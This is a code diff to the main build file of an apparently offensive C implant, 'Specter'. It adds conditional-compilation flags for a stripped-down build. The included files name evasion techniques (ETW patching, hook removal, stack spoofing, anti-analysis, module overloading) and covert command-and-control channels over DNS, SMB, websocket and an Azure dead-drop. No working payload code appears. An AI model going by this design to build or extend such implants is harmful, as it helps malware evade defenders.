@@ -16,43 +16,63 @@
 #include "peb.c"
 #include "heap.c"
 #include "crypto.c"
+#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
 #include "crypto_sign.c"
+#endif
 #include "syscalls.c"
 #include "syscall_wrappers.c"
+#ifndef SPECTER_BAREBONE
 #include "transform.c"
+#endif
 #include "config.c"
+#ifndef SPECTER_BAREBONE
 #include "profile.c"
+#endif
+#ifdef SPECTER_BAREBONE
+#include "sleep_barebone.c"
+#else
 #include "sleep.c"
+#endif
 #include "comms.c"
 
 /* Evasion modules */
 #include "evasion/evasion_core.c"
+#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULE_OVERLOAD)
+#include "evasion/modoverload.c"
+#endif
+#ifndef SPECTER_BAREBONE
 #include "evasion/stackspoof.c"
 #include "evasion/hooks.c"
 #include "evasion/etw.c"
 #include "evasion/memguard.c"
 #include "evasion/antianalysis.c"
-#include "evasion/modoverload.c"
 #include "evasion/pdata_reg.c"
 #include "evasion/ntcontinue_entry.c"
+#endif
 
+#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
 /* Bus / module system */
 #include "bus/bus_api.c"
 #include "bus/loader.c"
 #include "bus/guardian.c"
 #include "bus/lifecycle.c"
+#ifndef SPECTER_BAREBONE_MODULES
 #include "bus/beacon_shim.c"
 #include "bus/clr.c"
 #include "bus/inline_asm.c"
+#endif
+#endif
 
-/* Task execution — after bus modules so g_modmgr is visible */
+/* Task execution - after bus modules so g_modmgr is visible in full builds */
 #include "task_exec.c"
 
+#ifndef SPECTER_BAREBONE
 /* Comms channel implementations */
 #include "comms/azure_deadrop.c"
 #include "comms/dns.c"
 #include "comms/smb.c"
 #include "comms/websocket.c"
+#endif
 
 /* Entry point — MUST be last so .text.entry section ordering works,
    or use the linker script to place it first regardless */
